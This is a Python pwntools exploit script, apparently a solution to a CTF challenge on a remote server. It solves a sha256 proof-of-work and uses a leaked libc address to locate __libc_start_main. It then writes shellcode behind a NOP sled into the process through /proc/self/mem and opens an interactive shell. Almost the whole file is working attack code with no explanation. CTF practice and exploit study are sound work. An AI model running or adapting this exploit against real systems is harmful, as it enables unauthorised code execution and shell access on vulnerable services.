from pwn import *

remote_addr=['chuj.top',51622] #chuj.top 51622
context.terminal = ["/bin/tmux", "sp","-h"]
context.log_level=True
context.arch = 'amd64' 
context.os = 'linux'
io=remote(remote_addr[0],remote_addr[1])
# elf_path = "./echo"
# io = process(elf_path)
local = False

libc = ELF("./libc-2.27.so")
# libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# elf = ELF(elf_path)

#gdb.attach(p, 'c')


l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\x7f")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))


def lg(s,addr = None):
    if addr:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))
if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sla('your ????> ',tmpstr)
ru('write: ')
writeptr = int(io.recvuntil('\n', drop = True), base = 16)
log.success("writeptr: " + hex(writeptr))
libcbase = writeptr - libc.symbols['write']
log.success("libcbase: " + hex(libcbase))
libc_start_main = libcbase + libc.symbols['__libc_start_main']
log.success("__libc_start_main: " + hex(libc_start_main))
sla('path of it:\n>> ','/proc/self/mem\x00')
sla('>> ',str(libc_start_main))
payload = asm(shellcraft.sh()).rjust(0x300, asm('nop')) + '\n'
sla('>> ',payload)
irt()